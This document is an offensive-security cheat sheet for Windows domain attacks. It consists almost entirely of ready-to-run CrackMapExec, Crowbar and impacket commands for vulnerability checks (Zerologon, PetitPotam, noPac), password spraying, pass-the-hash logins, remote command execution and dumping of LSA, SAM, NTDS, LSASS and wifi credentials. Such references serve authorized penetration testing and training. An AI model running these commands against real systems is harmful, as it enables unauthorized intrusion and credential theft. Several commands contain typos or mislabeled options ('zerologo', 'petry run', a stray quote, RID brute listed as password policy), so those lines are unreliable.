# Password and Credential Spraying

#### [CrackMapExec](https://wiki.porchetta.industries/) <a href="#crackmapexec" id="crackmapexec"></a>

**Vulnerability scan**

```
#zerologon
crackmapexec smb <ip> -u '' -p '' -M zerologo

#Petitpotam
crackmapexec smb <ip> -u '' -p '' -M petitpotam

#nopac - Credentials required for this test
crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
```

**SMB**

```bash
# Host enumeration
crackmapexec smb $IP/24
```

```bash
# Checking Null Session
crackmapexec smb $IP -u '' -p ''
crackmapexec smb $IP --pass-pol
crackmapexec smb $IP --users
crackmapexec smb $IP --groups
```

```bash
# Anonymous Logins - random username and blank password
crackmapexec smb $IP -u 'a' -p ''

# Active Sessions on target
poetry run crackmapexec smb 192.168.1.0/24 -u 'username' -p 'password' --sessions

# LoggedOn Users
crackmapexec smb 192.168.1.0/24 -u 'username' -p 'password' --loggedon-users

# List shares and permissions
crackmapexec smb $IP -u 'username' -p 'password' --shares

# List Domain Users
crackmapexec smb $IP -u 'username' -p 'password' --users

# Enumerate Users with RID brute
crackmapexec smb $IP -u 'username' -p 'password' --rid-brute

# Enumerate Domain groups and localgroups
crackmapexec smb $IP -u 'username' -p 'password' --groups
crackmapexec smb $IP -u 'username' -p 'password' --local-group

# Passsword Policy
crackmapexec smb $IP -u 'username' -p 'password' --rid-brute

# SMB signing not required
crackmapexec smb $IP -u 'username' -p 'password' --gen-relay-list relaylistOutputFilename.txt

# AV Software installed
crackmapexec smb $IP -u 'username' -p 'password' -M enum_av-M enum_av
```

```
# Spraying
poetry run crackmapexec smb $IP -u user.txt -p password.txt --continue-on-success
poetry run crackmapexec smb $IP -u user.txt -p password.txt --no-bruteforce

# Default authentication is domain auth where green indicates successful login and pwn3d! marks local admin
petry run crackmapexec winrm $IP/24 -u <username>  -p '<password>' --local-auth
poetry run crackmapexec smb $IP -u Administrator -H '<hash>' --continue-on-success
```

```
# command execution cmd
poetry run crackmapexec $IP -u Administrator -p 'P@ssw0rd' -x whoami
# command execution powershell
poetry run crackmapexec $IP -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
```

> Getting Shell in Empire using CME: https://wiki.porchetta.industries/smb-protocol/command-execution/getting-shells-101

```
# Dumping Credentials
poetry run crackmapexec smb $IP/24 -u Administrator -H '<hash>' --local-auth --lsa
poetry run crackmapexec smb $IP/24 -u Administrator -H '<hash>' --local-auth --sam
poetry run crackmapexec smb $IP/24 -u Administrator -H '<hash>' --local-auth --lsa
poetry run crackmapexec smb $IP/24 -u Administrator -H '<hash>' --ntds
poetry run crackmapexec smb $IP -u administrator -p pass -M lsassy    #remotely dump creds
poetry run crackmapexec smb $IP -u administrator -p pass -M nanodump  #remotely dump creds
poetry run crackmapexec smb $IP -u administrator -p pass -M wireless  #wifipassword
```

**WinRM**

```
# smb
petry run crackmapexec winrm $IP/24 -u <username>  -p '<password>'          
petry run crackmapexec winrm $IP/24 -u users.txt  -p password.txt' --no-bruteforce
```

**MSSQL**

> Reference: https://wiki.porchetta.industries/mssql-protocol/mssql-privesc

#### Crowbar <a href="#crowbar" id="crowbar"></a>

```
crowbar -b rdp -s $IP/32 -u <username> -c '<password>' -n1 -v 
```

#### impacket-rdp\_check <a href="#impacket-rdp_check" id="impacket-rdp_check"></a>

```
impacket-rdp_check <domain/user>:<password>@$IP
impacket-rdp_check <domain/user>@$IP -hashes LMHASH:NTHASH
```
